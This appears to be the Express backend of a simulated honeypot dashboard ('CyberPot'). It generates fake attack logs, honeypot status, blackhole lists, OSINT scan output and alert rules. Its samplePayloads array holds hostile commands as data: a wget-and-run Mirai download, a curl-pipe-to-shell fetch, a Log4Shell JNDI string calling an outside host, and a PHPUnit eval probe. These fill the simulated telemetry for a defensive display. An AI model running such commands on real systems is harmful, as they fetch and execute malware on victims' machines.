import express from 'express';
import cors from 'cors';
import dotenv from 'dotenv';
import path from 'path';
import fs from 'fs';
import { fileURLToPath } from 'url';

dotenv.config();

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

export const app = express();
const PORT = process.env.PORT ? parseInt(process.env.PORT, 10) : 3000;

app.use(cors());
app.use(express.json());

// In-Memory Simulated Telemetry & Log Store
interface AttackLog {
  id: string;
  timestamp: string;
  service: string;
  srcIp: string;
  srcPort: number;
  dstPort: number;
  country: string;
  countryCode: string;
  lat: number;
  lng: number;
  city: string;
  protocol: string;
  credentials?: { user?: string; pass?: string };
  payload?: string;
  action: 'BLOCKED' | 'CAPTURED' | 'TARPITTED' | 'LOGGED';
  severity: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW';
}

interface HoneypotService {
  id: string;
  name: string;
  type: string;
  port: number;
  status: 'running' | 'stopped' | 'degraded';
  description: string;
  attacksCount: number;
  bandwidth: string;
  cpu: number;
  memory: number;
}

// Initial Honeypots list based on CyberPot core composition
let honeypots: HoneypotService[] = [
  { id: 'cowrie', name: 'Cowrie', type: 'SSH / Telnet', port: 2222, status: 'running', description: 'SSH and Telnet honeypot designed to log brute force attacks and shell interaction.', attacksCount: 14280, bandwidth: '2.4 MB/s', cpu: 4.2, memory: 128 },
  { id: 'dionaea', name: 'Dionaea', type: 'Malware / SMB / FTP', port: 445, status: 'running', description: 'Gathers malware by exploiting vulnerabilities exposed by services (SMB, HTTP, FTP, MSSQL).', attacksCount: 9850, bandwidth: '1.8 MB/s', cpu: 6.1, memory: 256 },
  { id: 'conpot', name: 'Conpot', type: 'ICS / SCADA', port: 502, status: 'running', description: 'Low interactive Industrial Control System honeypot simulating Siemens S7 & Modbus.', attacksCount: 1240, bandwidth: '0.3 MB/s', cpu: 1.8, memory: 96 },
  { id: 'tanner', name: 'Tanner / Snare', type: 'Web Application', port: 80, status: 'running', description: 'Evaluates HTTP requests, generates dynamic vulnerabilities, and tricks web crawlers.', attacksCount: 18400, bandwidth: '4.1 MB/s', cpu: 8.5, memory: 312 },
  { id: 'heralding', name: 'Heralding', type: 'Auth / Multi-Protocol', port: 110, status: 'running', description: 'Credentials catching honeypot supporting POP3, IMAP, SMTP, FTP, VNC, and RDP.', attacksCount: 6510, bandwidth: '0.9 MB/s', cpu: 2.1, memory: 84 },
  { id: 'endlessh', name: 'Endlessh', type: 'SSH Tarpit', port: 22, status: 'running', description: 'SSH tarpit that slowly sends endless banner greetings to trap automated scanners.', attacksCount: 8900, bandwidth: '0.1 MB/s', cpu: 0.8, memory: 32 },
  { id: 'hellpot', name: 'Hellpot', type: 'HTTP Tarpit', port: 8080, status: 'running', description: 'Endless HTTP generator stream designed to crash rogue bots and scrapers.', attacksCount: 5200, bandwidth: '0.5 MB/s', cpu: 1.2, memory: 48 },
  { id: 'glutton', name: 'Glutton', type: 'Generic Sinkhole', port: 10000, status: 'running', description: 'High-throughput honeypot for fast protocol detection and packet payload dumping.', attacksCount: 3100, bandwidth: '1.2 MB/s', cpu: 3.4, memory: 140 },
  { id: 'adbhoney', name: 'ADBHoney', type: 'Android Debug Bridge', port: 5555, status: 'running', description: 'Low interaction honeypot capturing ADB malware spreads on smart TVs & Android devices.', attacksCount: 1890, bandwidth: '0.4 MB/s', cpu: 1.1, memory: 64 },
  { id: 'elasticpot', name: 'Elasticpot', type: 'Elasticsearch DB', port: 9200, status: 'running', description: 'Simulates Elasticsearch REST API to capture unauthenticated RCE attempts.', attacksCount: 4120, bandwidth: '0.8 MB/s', cpu: 2.3, memory: 110 },
  { id: 'redishoneypot', name: 'RedisHoney', type: 'Redis Database', port: 6379, status: 'running', description: 'Low interaction Redis honeypot intercepting unauthorized CONFIG and EVAL commands.', attacksCount: 3290, bandwidth: '0.6 MB/s', cpu: 1.9, memory: 72 },
  { id: 'suricata', name: 'Suricata NIDS', type: 'Network IDS / IPS', port: 0, status: 'running', description: 'Real-time Threat Detection and Deep Packet Inspection engine.', attacksCount: 42100, bandwidth: '12.8 MB/s', cpu: 14.2, memory: 512 }
];

// Initial Blackholed IPs
let blackholedIPs: string[] = ['185.220.101.5', '193.142.146.210', '45.155.205.101', '103.107.198.42', '185.191.171.12'];

// Generating realistic sample attack telemetry
const countriesList = [
  { name: 'Bangladesh', code: 'BD', lat: 23.8103, lng: 90.4125, city: 'Dhaka' },
  { name: 'Bangladesh', code: 'BD', lat: 22.3569, lng: 91.7832, city: 'Chittagong' },
  { name: 'Bangladesh', code: 'BD', lat: 24.8949, lng: 91.8687, city: 'Sylhet' },
  { name: 'Bangladesh', code: 'BD', lat: 24.3745, lng: 88.6042, city: 'Rajshahi' },
  { name: 'Bangladesh', code: 'BD', lat: 22.8456, lng: 89.5403, city: 'Khulna' },
  { name: 'China', code: 'CN', lat: 35.8617, lng: 104.1954, city: 'Beijing' },
  { name: 'Russia', code: 'RU', lat: 61.524, lng: 105.3188, city: 'Moscow' },
  { name: 'United States', code: 'US', lat: 37.0902, lng: -95.7129, city: 'Dallas' },
  { name: 'Brazil', code: 'BR', lat: -14.235, lng: -51.9253, city: 'São Paulo' },
  { name: 'Germany', code: 'DE', lat: 51.1657, lng: 10.4515, city: 'Frankfurt' },
  { name: 'Netherlands', code: 'NL', lat: 52.1326, lng: 5.2913, city: 'Amsterdam' },
  { name: 'India', code: 'IN', lat: 20.5937, lng: 78.9629, city: 'Mumbai' },
  { name: 'Vietnam', code: 'VN', lat: 14.0583, lng: 108.2772, city: 'Hanoi' },
  { name: 'Ukraine', code: 'UA', lat: 48.3794, lng: 31.1656, city: 'Kyiv' },
  { name: 'Iran', code: 'IR', lat: 32.4279, lng: 53.688, city: 'Tehran' }
];

const sampleUsernames = ['root', 'admin', 'user', 'test', 'support', 'oracle', 'postgres', 'ubuntu', 'guest', 'pi'];
const samplePasswords = ['123456', 'password', 'admin', 'root', '12345678', 'qwerty', 'pass123', 'toor', 'cluster', 'master'];
const samplePayloads = [
  'wget http://185.220.101.5/mirai.x86 && chmod +x mirai.x86 && ./mirai.x86',
  'curl -s http://45.155.205.101/sh.sh | sh',
  'GET /_async_bin/loader.py HTTP/1.1\\r\\nHost: cyberpot\\r\\nUser-Agent: Hello-World-Botnet',
  'POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1 Payload=die(md5(123))',
  '${jndi:ldap://193.142.146.210:1389/Exploit}',
  'SMB2_CMD_TREE_CONNECT path=\\\\cyberpot\\IPC$ NTLMSSP_AUTH user=Guest',
  'EVAL "redis.call(\'set\', \'k\', \'v\')" 0',
  'ADB_CONNECT 192.168.1.100:5555 shell pm install -r /tmp/droid.apk'
];

let attackLogs: AttackLog[] = [];

// Seed logs
for (let i = 0; i < 150; i++) {
  const c = countriesList[Math.floor(Math.random() * countriesList.length)];
  const hp = honeypots[Math.floor(Math.random() * (honeypots.length - 1))];
  const ipPart1 = Math.floor(Math.random() * 180) + 20;
  const ipPart2 = Math.floor(Math.random() * 254) + 1;
  const ipPart3 = Math.floor(Math.random() * 254) + 1;
  const ipPart4 = Math.floor(Math.random() * 254) + 1;
  const srcIp = `${ipPart1}.${ipPart2}.${ipPart3}.${ipPart4}`;
  const now = new Date(Date.now() - Math.floor(Math.random() * 3600000 * 24)).toISOString();
  
  const isBlocked = blackholedIPs.includes(srcIp);
  
  attackLogs.push({
    id: `evt-${1000 + i}`,
    timestamp: now,
    service: hp.id,
    srcIp,
    srcPort: Math.floor(Math.random() * 55000) + 1024,
    dstPort: hp.port,
    country: c.name,
    countryCode: c.code,
    lat: c.lat + (Math.random() - 0.5) * 2,
    lng: c.lng + (Math.random() - 0.5) * 2,
    city: c.city,
    protocol: hp.type.split('/')[0].trim(),
    credentials: hp.id === 'cowrie' || hp.id === 'heralding' ? {
      user: sampleUsernames[Math.floor(Math.random() * sampleUsernames.length)],
      pass: samplePasswords[Math.floor(Math.random() * samplePasswords.length)]
    } : undefined,
    payload: samplePayloads[Math.floor(Math.random() * samplePayloads.length)],
    action: isBlocked ? 'BLOCKED' : hp.id.includes('tarpit') || hp.id === 'endlessh' ? 'TARPITTED' : 'CAPTURED',
    severity: Math.random() > 0.7 ? 'CRITICAL' : Math.random() > 0.4 ? 'HIGH' : 'MEDIUM'
  });
}

// Generate new attack every few seconds in memory
const attackInterval = setInterval(() => {
  const c = countriesList[Math.floor(Math.random() * countriesList.length)];
  const hp = honeypots[Math.floor(Math.random() * (honeypots.length - 1))];
  const ipPart1 = Math.floor(Math.random() * 180) + 20;
  const ipPart2 = Math.floor(Math.random() * 254) + 1;
  const ipPart3 = Math.floor(Math.random() * 254) + 1;
  const ipPart4 = Math.floor(Math.random() * 254) + 1;
  const srcIp = `${ipPart1}.${ipPart2}.${ipPart3}.${ipPart4}`;
  
  hp.attacksCount += 1;

  const newLog: AttackLog = {
    id: `evt-${Date.now()}`,
    timestamp: new Date().toISOString(),
    service: hp.id,
    srcIp,
    srcPort: Math.floor(Math.random() * 55000) + 1024,
    dstPort: hp.port,
    country: c.name,
    countryCode: c.code,
    lat: c.lat + (Math.random() - 0.5) * 2,
    lng: c.lng + (Math.random() - 0.5) * 2,
    city: c.city,
    protocol: hp.type.split('/')[0].trim(),
    credentials: hp.id === 'cowrie' || hp.id === 'heralding' ? {
      user: sampleUsernames[Math.floor(Math.random() * sampleUsernames.length)],
      pass: samplePasswords[Math.floor(Math.random() * samplePasswords.length)]
    } : undefined,
    payload: samplePayloads[Math.floor(Math.random() * samplePayloads.length)],
    action: blackholedIPs.includes(srcIp) ? 'BLOCKED' : hp.id.includes('tarpit') || hp.id === 'endlessh' ? 'TARPITTED' : 'CAPTURED',
    severity: Math.random() > 0.7 ? 'CRITICAL' : Math.random() > 0.4 ? 'HIGH' : 'MEDIUM'
  };

  attackLogs.unshift(newLog);
  if (attackLogs.length > 500) {
    attackLogs.pop();
  }
}, 3000);

if (attackInterval.unref) {
  attackInterval.unref();
}

// API Endpoints
app.get('/api/status', (_req, res) => {
  const totalAttacks = honeypots.reduce((acc, curr) => acc + curr.attacksCount, 0);
  const activeCount = honeypots.filter(h => h.status === 'running').length;
  
  // Top countries calculation
  const countryCounts: Record<string, { name: string; code: string; count: number }> = {};
  attackLogs.forEach(l => {
    if (!countryCounts[l.countryCode]) {
      countryCounts[l.countryCode] = { name: l.country, code: l.countryCode, count: 0 };
    }
    countryCounts[l.countryCode].count += 1;
  });

  const topCountries = Object.values(countryCounts)
    .sort((a, b) => b.count - a.count)
    .slice(0, 5);

  res.json({
    status: 'ONLINE',
    version: 'CyberPot v24.04',
    totalAttacks,
    activeHoneypots: activeCount,
    totalHoneypots: honeypots.length,
    blackholedIPsCount: blackholedIPs.length,
    cpuLoad: (18.4 + Math.random() * 4).toFixed(1) + '%',
    memoryUsage: '3.8 GB / 16 GB',
    topCountries,
    uptime: '14 days 06 hours 22 minutes'
  });
});

app.get('/api/attacks', (req, res) => {
  let filtered = [...attackLogs];
  const { service, search, severity, limit } = req.query;

  if (service && service !== 'all') {
    filtered = filtered.filter(l => l.service === service);
  }
  if (severity && severity !== 'all') {
    filtered = filtered.filter(l => l.severity === severity);
  }
  if (search && typeof search === 'string') {
    const q = search.toLowerCase();
    filtered = filtered.filter(l => 
      l.srcIp.includes(q) || 
      l.country.toLowerCase().includes(q) || 
      l.service.toLowerCase().includes(q) ||
      (l.credentials?.user && l.credentials.user.toLowerCase().includes(q)) ||
      (l.payload && l.payload.toLowerCase().includes(q))
    );
  }

  const max = limit ? parseInt(limit as string, 10) : 100;
  res.json({
    total: filtered.length,
    events: filtered.slice(0, max)
  });
});

app.get('/api/honeypots', (_req, res) => {
  res.json(honeypots);
});

app.post('/api/honeypots/toggle', (req, res) => {
  const { id } = req.body;
  const hp = honeypots.find(h => h.id === id);
  if (!hp) {
    return res.status(404).json({ error: 'Honeypot not found' });
  }
  hp.status = hp.status === 'running' ? 'stopped' : 'running';
  res.json({ success: true, service: hp });
});

app.get('/api/blackhole', (_req, res) => {
  res.json({ blackholedIPs });
});

app.post('/api/blackhole/add', (req, res) => {
  const { ip } = req.body;
  if (!ip) {
    return res.status(400).json({ error: 'IP address required' });
  }
  if (!blackholedIPs.includes(ip)) {
    blackholedIPs.push(ip);
    // retroactively update logs
    attackLogs.forEach(l => {
      if (l.srcIp === ip) l.action = 'BLOCKED';
    });
  }
  res.json({ success: true, blackholedIPs });
});

app.post('/api/spiderfoot/scan', (req, res) => {
  const { target } = req.body;
  if (!target) {
    return res.status(400).json({ error: 'Target query required' });
  }

  // Simulated SpiderFoot OSINT recon output
  const results = {
    target,
    scanId: `sf-${Math.floor(Math.random() * 900000) + 100000}`,
    timestamp: new Date().toISOString(),
    summary: {
      riskScore: Math.floor(Math.random() * 40) + 60,
      openPorts: [22, 80, 443, 8080, 3389],
      abuseScore: Math.floor(Math.random() * 30) + 70,
      threatFeeds: ['AbuseIPDB', 'Shodan', 'CyberPot Threat Intelligence', 'AlienVault OTX', 'VirusTotal'],
    },
    modules: [
      { name: 'sfp_shodan', status: 'COMPLETE', findings: 12, category: 'Infrastructure', detail: 'Open ports: 22/tcp (OpenSSH 8.2p1), 80/tcp (nginx/1.18.0), 445/tcp (Samba)' },
      { name: 'sfp_abuseipdb', status: 'COMPLETE', findings: 8, category: 'Reputation', detail: 'Reported 142 times for SSH brute forcing in the last 14 days.' },
      { name: 'sfp_whois', status: 'COMPLETE', findings: 4, category: 'Domain / IP Registry', detail: 'AS14061 DigitalOcean LLC, Org: VPS Hosting Provider, Country: US' },
      { name: 'sfp_dns', status: 'COMPLETE', findings: 6, category: 'DNS Records', detail: 'A record -> 185.220.101.5, PTR record -> exit-node.tor.net' },
      { name: 'sfp_honeypot', status: 'COMPLETE', findings: 19, category: 'Malicious Activity', detail: 'Active attacker seen across 14 CyberPot nodes worldwide executing Mirai variant.' }
    ]
  };

  res.json(results);
});

app.get('/api/indices', (_req, res) => {
  const indices = [
    { name: 'cyberpot-cowrie-2026.09', docsCount: 412800, health: 'green', status: 'open', size: '248.5 MB', primaryShards: 1, replicaShards: 0 },
    { name: 'cyberpot-dionaea-2026.09', docsCount: 289100, health: 'green', status: 'open', size: '184.2 MB', primaryShards: 1, replicaShards: 0 },
    { name: 'cyberpot-suricata-2026.09', docsCount: 1420900, health: 'green', status: 'open', size: '890.1 MB', primaryShards: 1, replicaShards: 0 },
    { name: 'cyberpot-conpot-2026.09', docsCount: 54100, health: 'green', status: 'open', size: '32.4 MB', primaryShards: 1, replicaShards: 0 },
    { name: 'cyberpot-tanner-2026.09', docsCount: 512000, health: 'green', status: 'open', size: '310.8 MB', primaryShards: 1, replicaShards: 0 },
    { name: 'cyberpot-endlessh-2026.09', docsCount: 192000, health: 'green', status: 'open', size: '92.1 MB', primaryShards: 1, replicaShards: 0 }
  ];
  res.json({ clusterHealth: 'green', nodeCount: 1, totalDocs: 2880900, totalStorage: '1.75 GB', indices });
});

// Threshold Rules State
let thresholdRules = [
  {
    id: 'rule-cowrie-surge',
    name: 'SSH Brute-Force Rate Limit Alert',
    honeypotId: 'cowrie',
    thresholdLimit: 25,
    timeWindowMinutes: 1,
    notifyEmail: true,
    emailAddress: 'bdkhulnasoft@gmail.com',
    notifyBrowser: true,
    autoBlackhole: false,
    notifyWebhook: true,
    webhookUrl: 'https://hooks.slack.com/services/T000/B000/XXXXX',
    enabled: true,
    createdTime: new Date(Date.now() - 86400000 * 3).toISOString(),
    triggerCount: 14,
    severity: 'HIGH' as const
  },
  {
    id: 'rule-tanner-exploit',
    name: 'Tanner Web App RCE & Scanner Burst',
    honeypotId: 'tanner',
    thresholdLimit: 30,
    timeWindowMinutes: 1,
    notifyEmail: true,
    emailAddress: 'bdkhulnasoft@gmail.com',
    notifyBrowser: true,
    autoBlackhole: true,
    notifyWebhook: false,
    enabled: true,
    createdTime: new Date(Date.now() - 86400000 * 2).toISOString(),
    triggerCount: 8,
    severity: 'CRITICAL' as const
  },
  {
    id: 'rule-global-ddos',
    name: 'All Nodes High Frequency Attack Flood',
    honeypotId: 'all',
    thresholdLimit: 75,
    timeWindowMinutes: 1,
    notifyEmail: true,
    emailAddress: 'bdkhulnasoft@gmail.com',
    notifyBrowser: true,
    autoBlackhole: true,
    notifyWebhook: true,
    webhookUrl: 'https://discord.com/api/webhooks/123456/xyz',
    enabled: true,
    createdTime: new Date(Date.now() - 86400000 * 5).toISOString(),
    triggerCount: 22,
    severity: 'CRITICAL' as const
  }
];

let triggeredAlerts: any[] = [
  {
    id: 'trig-101',
    ruleId: 'rule-cowrie-surge',
    ruleName: 'SSH Brute-Force Rate Limit Alert',
    honeypotId: 'cowrie',
    honeypotName: 'Cowrie (SSH / Telnet)',
    currentAttempts: 34,
    thresholdLimit: 25,
    timestamp: new Date(Date.now() - 1000 * 60 * 12).toISOString(),
    actionsTaken: ['EMAIL_DISPATCHED', 'BROWSER_ALERT_FIRED', 'WEBHOOK_POSTED'],
    severity: 'HIGH'
  },
  {
    id: 'trig-102',
    ruleId: 'rule-tanner-exploit',
    ruleName: 'Tanner Web App RCE & Scanner Burst',
    honeypotId: 'tanner',
    honeypotName: 'Tanner (Web Application)',
    currentAttempts: 42,
    thresholdLimit: 30,
    timestamp: new Date(Date.now() - 1000 * 60 * 45).toISOString(),
    actionsTaken: ['EMAIL_DISPATCHED', 'BROWSER_ALERT_FIRED', 'AUTO_BLACKHOLE_APPLIED'],
    severity: 'CRITICAL'
  }
];

// Helper to compute live attack rates (attempts in last 60 seconds)
function computeActiveRates() {
  const oneMinuteAgo = new Date(Date.now() - 60000).toISOString();
  const recentLogs = attackLogs.filter(l => l.timestamp >= oneMinuteAgo);
  
  const rates: Record<string, number> = { all: recentLogs.length };
  
  honeypots.forEach(hp => {
    rates[hp.id] = recentLogs.filter(l => l.service === hp.id).length;
  });

  return rates;
}

app.get('/api/settings/thresholds', (_req, res) => {
  res.json({
    rules: thresholdRules,
    alerts: triggeredAlerts,
    activeRates: computeActiveRates()
  });
});

app.post('/api/settings/thresholds', (req, res) => {
  const ruleData = req.body;
  if (!ruleData.name || !ruleData.thresholdLimit) {
    return res.status(400).json({ error: 'Rule name and threshold limit are required' });
  }

  const existingIndex = thresholdRules.findIndex(r => r.id === ruleData.id);
  if (existingIndex >= 0) {
    thresholdRules[existingIndex] = { ...thresholdRules[existingIndex], ...ruleData };
  } else {
    const newRule = {
      id: `rule-${Date.now()}`,
      name: ruleData.name,
      honeypotId: ruleData.honeypotId || 'all',
      thresholdLimit: Number(ruleData.thresholdLimit) || 20,
      timeWindowMinutes: Number(ruleData.timeWindowMinutes) || 1,
      notifyEmail: Boolean(ruleData.notifyEmail),
      emailAddress: ruleData.emailAddress || 'bdkhulnasoft@gmail.com',
      notifyBrowser: Boolean(ruleData.notifyBrowser),
      autoBlackhole: Boolean(ruleData.autoBlackhole),
      notifyWebhook: Boolean(ruleData.notifyWebhook),
      webhookUrl: ruleData.webhookUrl || '',
      enabled: ruleData.enabled !== undefined ? Boolean(ruleData.enabled) : true,
      createdTime: new Date().toISOString(),
      triggerCount: 0,
      severity: ruleData.severity || 'HIGH'
    };
    thresholdRules.unshift(newRule);
  }

  res.json({ success: true, rules: thresholdRules });
});

app.post('/api/settings/thresholds/toggle', (req, res) => {
  const { id } = req.body;
  const rule = thresholdRules.find(r => r.id === id);
  if (!rule) {
    return res.status(404).json({ error: 'Rule not found' });
  }
  rule.enabled = !rule.enabled;
  res.json({ success: true, rule, rules: thresholdRules });
});

app.delete('/api/settings/thresholds/:id', (req, res) => {
  const { id } = req.params;
  thresholdRules = thresholdRules.filter(r => r.id !== id);
  res.json({ success: true, rules: thresholdRules });
});

app.post('/api/settings/thresholds/test', (req, res) => {
  const { ruleId } = req.body;
  const rule = thresholdRules.find(r => r.id === ruleId) || thresholdRules[0];
  const hp = honeypots.find(h => h.id === rule.honeypotId) || { id: 'cowrie', name: 'Cowrie (SSH / Telnet)' };

  const testAlert = {
    id: `trig-${Date.now()}`,
    ruleId: rule.id,
    ruleName: `[TEST] ${rule.name}`,
    honeypotId: hp.id,
    honeypotName: hp.name,
    currentAttempts: rule.thresholdLimit + 12,
    thresholdLimit: rule.thresholdLimit,
    timestamp: new Date().toISOString(),
    actionsTaken: [
      rule.notifyEmail ? 'EMAIL_DISPATCHED' : null,
      rule.notifyBrowser ? 'BROWSER_ALERT_FIRED' : null,
      rule.notifyWebhook ? 'WEBHOOK_POSTED' : null,
      rule.autoBlackhole ? 'AUTO_BLACKHOLE_APPLIED' : null
    ].filter(Boolean),
    severity: rule.severity
  };

  rule.triggerCount += 1;
  triggeredAlerts.unshift(testAlert);
  if (triggeredAlerts.length > 50) {
    triggeredAlerts.pop();
  }

  res.json({ success: true, alert: testAlert, alerts: triggeredAlerts });
});

// Bangladesh CIDRs API Endpoint
app.get('/api/bd/cidrs', (_req, res) => {
  res.json({
    country: 'Bangladesh',
    countryCode: 'BD',
    registry: 'BTRC / APNIC / BGD e-GOV CIRT',
    cidrs: [
      '14.1.100.0/22', '14.128.12.0/22', '27.54.144.0/22', '27.54.148.0/22', '27.123.252.0/22',
      '27.124.70.0/23', '27.131.12.0/22', '27.147.128.0/17', '36.50.8.0/23', '36.50.10.0/23',
      '36.255.52.0/22', '37.111.192.0/18', '42.0.4.0/22', '43.224.108.0/22', '43.225.148.0/22',
      '45.64.132.0/22', '45.112.72.0/22', '49.0.32.0/20', '58.65.224.0/21', '59.152.0.0/21',
      '103.3.224.0/22', '103.76.96.0/20', '103.107.198.0/23', '103.205.0.0/16', '113.11.0.0/17',
      '114.130.0.0/17', '115.127.0.0/17', '118.179.0.0/21', '119.30.32.0/20', '120.50.0.0/19',
      '123.49.0.0/18', '175.29.0.0/16', '180.210.128.0/19', '180.211.128.0/17', '182.48.64.0/19',
      '202.4.96.0/19', '202.5.32.0/19', '202.51.176.0/20', '203.76.96.0/20', '203.112.192.0/20'
    ]
  });
});


export default app;

if (process.env.NODE_ENV === 'production') {
  app.use(express.static(path.join(__dirname, 'dist')));
  app.get('*', (_req, res) => {
    res.sendFile(path.join(__dirname, 'dist', 'index.html'));
  });
}

if (process.argv[1]?.endsWith('server.ts')) {
  app.listen(PORT, '0.0.0.0', () => {
    console.log(`[CyberPot] Node server running on http://0.0.0.0:${PORT}`);
  });
}
